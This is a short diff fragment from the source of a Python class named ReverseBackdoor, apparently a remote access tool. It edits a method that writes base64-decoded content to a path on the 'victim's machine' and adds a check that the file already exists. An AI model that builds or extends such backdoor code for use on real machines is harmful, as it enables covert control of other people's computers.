@@ -95,10 +95,13 @@ class ReverseBackdoor:
 		write downloaded contents from the victim 
 		to the specified path file.
 		'''
-		with open(path, 'wb') as file:
-			bytes_content = base64.b64decode(content)
-			file.write(bytes_content)
-			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
+		if os.path.isfile(path):
+			with open(path, 'wb') as file:
+				bytes_content = base64.b64decode(content)
+				file.write(bytes_content)
+				return (f"[*] File {path} Downloaded successfully on Victim's machine.")
+		else:
+			return f"[-] Exception : File {path} doesn't exist."
 	
 	
 	def run(self):
